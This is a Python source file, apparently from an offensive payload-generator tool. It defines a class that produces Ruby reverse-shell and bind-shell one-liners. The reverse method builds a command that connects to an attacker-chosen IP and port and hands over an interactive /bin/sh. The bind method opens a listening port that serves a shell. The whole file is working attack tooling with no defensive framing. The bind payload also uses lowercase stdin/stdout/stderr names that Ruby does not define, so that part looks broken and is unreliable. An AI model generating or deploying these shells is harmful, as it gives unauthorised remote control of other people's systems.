"""
Ruby reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class RubyGenerator(PayloadGenerator):
    """Standard Ruby TCPSocket reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
            f'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        )

    def bind(self, port: int) -> str:
        return (
            f"ruby -rsocket -e'"
            f"s=TCPServer.new({port});"
            f"c=s.accept;"
            f'stdin.reopen(c);stdout.reopen(c);stderr.reopen(c);'
            f'exec("/bin/sh -i")\''
        )

    def file_extension(self) -> str:
        return ".rb"
